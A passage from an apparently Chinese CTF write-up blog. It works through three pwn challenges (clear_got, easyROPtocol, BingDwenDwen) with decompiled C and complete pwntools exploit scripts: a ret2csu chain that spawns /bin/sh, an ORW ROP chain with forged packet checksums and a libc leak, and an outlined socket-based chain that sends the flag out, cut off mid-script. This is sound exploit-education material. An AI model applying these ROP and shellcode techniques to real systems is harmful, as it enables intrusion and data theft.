class="built_in">memset</span>(&amp;qword_601008, <span class="number">0</span>, <span class="number">0x38</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到存在一处栈溢出，然后下面将got表全部清空，但是题目给了两个用syscall直接调用的函数，所以我的第一反应就是SROP，不过WP的方法感觉更为简单，就是ret2csu即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./clear_got&#x27;</span>)</span><br><span class="line">r = process(<span class="string">&#x27;./clear_got&#x27;</span>)</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">&#x27;gnome-terminal&#x27;</span>, <span class="string">&#x27;-x&#x27;</span>, <span class="string">&#x27;sh&#x27;</span>, <span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">bss = elf.bss()+<span class="number">0x20</span></span><br><span class="line">syscall_ret = <span class="number">0x40077E</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x60</span>+<span class="number">0x8</span>)+p64(<span class="number">0x4007EA</span>)+p64(<span class="number">0xc01c8</span>) + \</span><br><span class="line">    p64(<span class="number">0xc01c9</span>)+p64(<span class="number">0</span>)+p64(<span class="number">59</span>)+p64(bss)+p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(<span class="number">0x4007D0</span>)+p64(<span class="number">0</span>)+p64((bss+<span class="number">8</span>)//<span class="number">8</span>)+p64((bss+<span class="number">8</span>)//<span class="number">8</span>+<span class="number">1</span>) + \</span><br><span class="line">    p64(<span class="number">0</span>)*<span class="number">3</span>+p64(bss)+p64(syscall_ret)+p64(<span class="number">0x4007D0</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">0x100</span>, <span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">info(<span class="string">&#x27;bss=&gt;&#x27;</span>+<span class="built_in">hex</span>(bss))</span><br><span class="line"><span class="comment"># gdb.attach(r)</span></span><br><span class="line">r.send(payload)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;/bin/sh\x00&#x27;</span>+p64(syscall_ret)</span><br><span class="line">payload = payload.ljust(<span class="number">59</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>这里比较巧妙的一点就是在最后到0x4007D0这个地址时其实是用call了那个syscall来实现调用的。</p><h2 id="easyROPtocol"><a href="#easyROPtocol" class="headerlink" title="easyROPtocol"></a>easyROPtocol</h2><p>这道题目的难度也不是很大，关键是把结构体搞清楚就好(真是越看越想打自己)。</p><h3 id="题目分析-1"><a href="#题目分析-1" class="headerlink" title="题目分析"></a>题目分析</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tcp</span>&#123;</span></span><br><span class="line">    <span class="number">0x766e</span>; <span class="comment">// size=2</span></span><br><span class="line">    <span class="number">0x28b7</span>; <span class="comment">// size=2</span></span><br><span class="line">    <span class="number">0</span>xn001; <span class="comment">// size=4</span></span><br><span class="line">    <span class="number">0x1</span>;    <span class="comment">// size=4</span></span><br><span class="line">    <span class="number">0x6</span>;    <span class="comment">// size=2</span></span><br><span class="line">    <span class="number">0x1</span>;<span class="comment">// size=2</span></span><br><span class="line"><span class="comment">// size=2</span></span><br><span class="line">    <span class="number">0x0</span>;<span class="comment">// size=2</span></span><br><span class="line">    <span class="number">0x1</span>;<span class="comment">// size=2</span></span><br><span class="line">    <span class="number">0xffff</span>; <span class="comment">// size=2</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后推出来的结构体</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">sub_401830</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">void</span> *v0; <span class="comment">// rbx</span></span><br><span class="line">  <span class="keyword">size_t</span> v1; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">size_t</span> v2; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">24</span>]; <span class="comment">// [rsp+0h] [rbp-3020h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+3008h] [rbp-18h]</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// [rsp+300Ch] [rbp-14h]</span></span><br><span class="line"></span><br><span class="line">  v6 = <span class="number">1</span>;</span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x3000</span>uLL);</span><br><span class="line">  <span class="keyword">while</span> ( dword_40422C )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">3</span> &amp;&amp; (!chunk_arr[i] || *(chunk_arr[i] + <span class="number">4LL</span>) != v6); ++i )</span><br><span class="line">      ;</span><br><span class="line">    <span class="keyword">if</span> ( i == <span class="number">4</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( <span class="number">4</span> * (*(chunk_arr[i] + <span class="number">12LL</span>) &amp; <span class="number">0xF</span>) != <span class="number">20</span> &amp;&amp; *(chunk_arr[i] + <span class="number">20LL</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      v0 = (chunk_arr[i] + <span class="number">4</span> * (*(chunk_arr[i] + <span class="number">12LL</span>) &amp; <span class="number">0xF</span>));</span><br><span class="line">      v1 = <span class="built_in">strlen</span>(s);</span><br><span class="line">      <span class="built_in">memcpy</span>(&amp;s[v1], v0, <span class="number">0x1000</span>uLL);</span><br><span class="line">      v6 += <span class="number">4096</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">strcpy</span>(s, (<span class="number">4</span> * (*(chunk_arr[i] + <span class="number">12LL</span>) &amp; <span class="number">0xF</span>) + chunk_arr[i]));</span><br><span class="line">      dword_40422C = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  v2 = <span class="built_in">strlen</span>(s);</span><br><span class="line">  write(<span class="number">1</span>, s, v2);</span><br><span class="line">  <span class="keyword">return</span> write(<span class="number">1</span>, <span class="string">&quot;Done.\n&quot;</span>, <span class="number">6uLL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先是看漏洞函数，这里存在一处栈溢出，<code>memcpy(&amp;s[v1], v0, 0x1000uLL);</code>但是要实现需要满足上面的条件，这就必须要去搞清楚结构体了。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sub_40164F</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">size_t</span> v0; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">3</span> &amp;&amp; *(&amp;chunk_arr + i); ++i )</span><br><span class="line">    ;</span><br><span class="line">  <span class="keyword">if</span> ( i != <span class="number">4</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    *(&amp;chunk_arr + i) = <span class="built_in">malloc</span>(<span class="number">0x1000</span>uLL);</span><br><span class="line">    read(<span class="number">0</span>, *(&amp;chunk_arr + i), <span class="number">0x1000</span>uLL);</span><br><span class="line">    v1 = sub_4014AF(*(&amp;chunk_arr + i));</span><br><span class="line">    <span class="keyword">if</span> ( (sub_401590(*(&amp;chunk_arr + i)) &amp; v1) == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      dword_40422C = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v0 = <span class="built_in">strlen</span>(aBengBuZhuLe);</span><br><span class="line">      write(<span class="number">2</span>, aBengBuZhuLe, v0);</span><br><span class="line">      <span class="built_in">free</span>(*(&amp;chunk_arr + i));</span><br><span class="line">      *(&amp;chunk_arr + i) = <span class="number">0LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>想要成功创建出结构体就必须要通过那个if语句，也就是v1和前面的sub_401590(*(&amp;chunk_arr + i)都为1。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">sub_4014AF</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( *a1 != <span class="number">0x766E</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( *(a1 + <span class="number">2</span>) != <span class="number">0x28B7</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !*(a1 + <span class="number">4</span>) )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !*(a1 + <span class="number">8</span>) )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !*(a1 + <span class="number">14</span>) )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( *(a1 + <span class="number">18</span>) )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">4</span> * (*(a1 + <span class="number">12</span>) &amp; <span class="number">0xF</span>) == <span class="number">20</span> )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_18;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">4</span> * (*(a1 + <span class="number">12</span>) &amp; <span class="number">0xF</span>) != <span class="number">24</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( *(a1 + <span class="number">22</span>) == <span class="number">0xFFFF</span> )</span><br><span class="line">LABEL_18:</span><br><span class="line">    result = <span class="number">1LL</span>;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    result = <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">_BOOL8 __fastcall <span class="title">sub_401590</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v2[<span class="number">23</span>]; <span class="comment">// [rsp+Bh] [rbp-1Dh] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int16 j; <span class="comment">// [rsp+22h] [rbp-6h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int16 i; <span class="comment">// [rsp+24h] [rbp-4h]</span></span><br><span class="line">  __int16 v5; <span class="comment">// [rsp+26h] [rbp-2h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">strcpy</span>(v2, <span class="string">&quot;fakeipheadfa&quot;</span>);</span><br><span class="line">  *&amp;v2[<span class="number">13</span>] = v2;</span><br><span class="line">  v5 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">5u</span>; ++i )</span><br><span class="line">    v5 ^= *(<span class="number">2LL</span> * i + *&amp;v2[<span class="number">13</span>]);</span><br><span class="line">  *&amp;v2[<span class="number">13</span>] = a1;</span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">0x7FF</span>u; ++j )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( j != <span class="number">8</span> )</span><br><span class="line">      v5 ^= *(<span class="number">2LL</span> * j + *&amp;v2[<span class="number">13</span>]);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v5 == *(a1 + <span class="number">16</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>很容易就可以推出来结构体(下面这个函数当中是当j!=8我一直以为是chunk_addr+8，结果卡了半个小时发现是2*j(我是傻逼)</p><p>程序开启了沙箱所以使用orw即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">r = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc-2.31.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">&#x27;gnome-terminal&#x27;</span>, <span class="string">&#x27;-x&#x27;</span>, <span class="string">&#x27;sh&#x27;</span>, <span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">package</span>(<span class="params">addr_4, content</span>):</span></span><br><span class="line">    pack = p16(<span class="number">0x766e</span>)</span><br><span class="line">    pack += p16(<span class="number">0x28b7</span>)</span><br><span class="line">    pack += p32(addr_4)</span><br><span class="line">    pack += p32(<span class="number">0x1</span>)</span><br><span class="line">    pack += p16(<span class="number">0x6</span>)</span><br><span class="line">    pack += p16(<span class="number">0x1</span>)</span><br><span class="line">    pack += p16(<span class="number">0x0</span>)</span><br><span class="line">    pack += p16(<span class="number">0x0</span>)</span><br><span class="line">    pack += p16(<span class="number">0x1</span>)</span><br><span class="line">    pack += p16(<span class="number">0xffff</span>)+content</span><br><span class="line">    v2 = <span class="string">&#x27;fakeipheadfa&#x27;</span></span><br><span class="line">    v5 = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">        v5 = v5 ^ <span class="built_in">int</span>(<span class="built_in">hex</span>(<span class="built_in">ord</span>(v2[:<span class="number">2</span>][::-<span class="number">1</span>][<span class="number">0</span>])) +</span><br><span class="line">                      <span class="built_in">hex</span>(<span class="built_in">ord</span>(v2[:<span class="number">2</span>][::-<span class="number">1</span>][<span class="number">1</span>]))[<span class="number">2</span>:], <span class="number">16</span>)</span><br><span class="line">        v2 = v2[<span class="number">2</span>:]</span><br><span class="line">    a1 = pack</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x800</span>):</span><br><span class="line">        v5 = v5 ^ u16(a1[:<span class="number">2</span>])</span><br><span class="line">        a1 = a1[<span class="number">2</span>:]</span><br><span class="line">    pack = pack[:<span class="number">16</span>]+p16(v5)+pack[<span class="number">18</span>:]</span><br><span class="line">    <span class="keyword">return</span> pack</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span>(<span class="params">content</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;4. Quit.&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    r.send(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params"><span class="built_in">id</span></span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;4. Quit.&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Which?&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">bytes</span>(<span class="built_in">str</span>(<span class="built_in">id</span>), encoding=<span class="string">&#x27;utf8&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">vuln</span>():</span></span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;4. Quit.&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x0000000000401bb3</span></span><br><span class="line">pop_rsi_r15 = <span class="number">0x0000000000401bb1</span></span><br><span class="line">main = <span class="number">0x401A5E</span></span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_plt = elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">read_plt = elf.plt[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">bss = elf.bss()+<span class="number">0x28</span></span><br><span class="line"></span><br><span class="line">create(package(<span class="number">1</span>, <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x1000</span>-<span class="number">24</span>)))</span><br><span class="line">create(package(<span class="number">0x1001</span>, <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x1000</span>-<span class="number">24</span>)))</span><br><span class="line">create(package(<span class="number">0x2001</span>, <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x1000</span>-<span class="number">24</span>)))</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x3020</span>+<span class="number">0x8</span>-(<span class="number">0x1000</span>-<span class="number">24</span>)*<span class="number">3</span>)+p64(pop_rdi) + \</span><br><span class="line">    p64(<span class="number">1</span>)+p64(pop_rsi_r15)+p64(write_got)+p64(<span class="number">0</span>)+p64(write_plt)+p64(main)</span><br><span class="line">create(package(<span class="number">0x3001</span>, payload.ljust(<span class="number">0x1000</span>-<span class="number">24</span>, <span class="string">b&#x27;\x00&#x27;</span>)))</span><br><span class="line"></span><br><span class="line">vuln()</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;Done.\n&#x27;</span>)</span><br><span class="line">write_addr = u64(r.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">libc_base = write_addr+libc.symbols[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">open_addr = libc_base+libc.symbols[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line">pop_rdx = libc_base+<span class="built_in">next</span>(libc.search(asm(<span class="string">&#x27;pop rdx\nret&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>)))</span><br><span class="line">pop_rsi = libc_base+<span class="built_in">next</span>(libc.search(asm(<span class="string">&#x27;pop rsi\nret&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>)))</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">create(package(<span class="number">1</span>, <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x1000</span>-<span class="number">24</span>)))</span><br><span class="line">create(package(<span class="number">0x1001</span>, <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x1000</span>-<span class="number">24</span>)))</span><br><span class="line">create(package(<span class="number">0x2001</span>, <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x1000</span>-<span class="number">24</span>)))</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x3020</span>+<span class="number">0x8</span>-(<span class="number">0x1000</span>-<span class="number">24</span>)*<span class="number">3</span>-<span class="number">6</span>) + p64(pop_rdi) + \</span><br><span class="line">    p64(<span class="number">0</span>)+p64(pop_rsi)+p64(bss)+p64(pop_rdx)+p64(<span class="number">0x5</span>)+p64(read_plt)</span><br><span class="line">payload += p64(pop_rdi)+p64(bss)+p64(pop_rsi)+p64(<span class="number">0</span>)+p64(open_addr)</span><br><span class="line">payload += p64(pop_rdi)+p64(<span class="number">3</span>)+p64(pop_rsi)+p64(bss) + \</span><br><span class="line">    p64(pop_rdx)+p64(<span class="number">0x30</span>)+p64(read_plt)</span><br><span class="line">payload += p64(pop_rdi)+p64(<span class="number">1</span>)+p64(pop_rsi)+p64(bss) + \</span><br><span class="line">    p64(pop_rdx)+p64(<span class="number">0x30</span>)+p64(write_plt)</span><br><span class="line">create(package(<span class="number">0x3001</span>, payload.ljust(<span class="number">0x1000</span>-<span class="number">24</span>, <span class="string">b&#x27;\x00&#x27;</span>)))</span><br><span class="line">gdb.attach(r)</span><br><span class="line">vuln()</span><br><span class="line">r.send(<span class="string">b&#x27;flag\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h2 id="BingDwenDwen"><a href="#BingDwenDwen" class="headerlink" title="BingDwenDwen"></a>BingDwenDwen</h2><p>看似是一个简单的栈溢出，但是这道题关闭了三个基本的IO流，所以没法泄漏没法多次什么的，需要用到反弹shell。而且题目又开了沙箱，所以只能使用orw然后将结果写入socket流。</p><p>主要流程：open(flag,0) -&gt; read(fd,flag_addr,0x30) -&gt; socket(AF_INET, SOCK_STREAM, IPPROTO_IP) -&gt; dup2(soc,2) -&gt; connect(soc, (struct sockaddr *)&amp;serv_addr,sizeof(struct sockaddr_in)) -&gt;  write(2,flag,0x30)。官方的wp写的也很清楚。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">r = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">&#x27;gnome-terminal&#x27;</span>, <span class="string">&#x27;-x&#x27;</span>, <span class="string">&#x27;sh&#x27;</span>, <span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x0000000000401356</span></span><br><span class="line">pop_rsi = <span class="number">0x0000000000401358</span></span><br><span class="line">pop_rdx = <span class="number">0x0000000000401354</span></span><br><span class="line">pop_rax = <span class="number">0x000000000040135a</span></span><br><span class="line">syscall_ret = <span class="number">0x0000000000401351</span></span><br><span class="line">mov_rdi_rcx = <span class="number">0x000000000040135f</span></span><br><span class="line">push_rax_pop_rcx = <span class="number">0x40135C</span></span><br><span class="line">bingdwendwen = <span class="number">0x403700</span></span><br><span class="line">flag_addr = 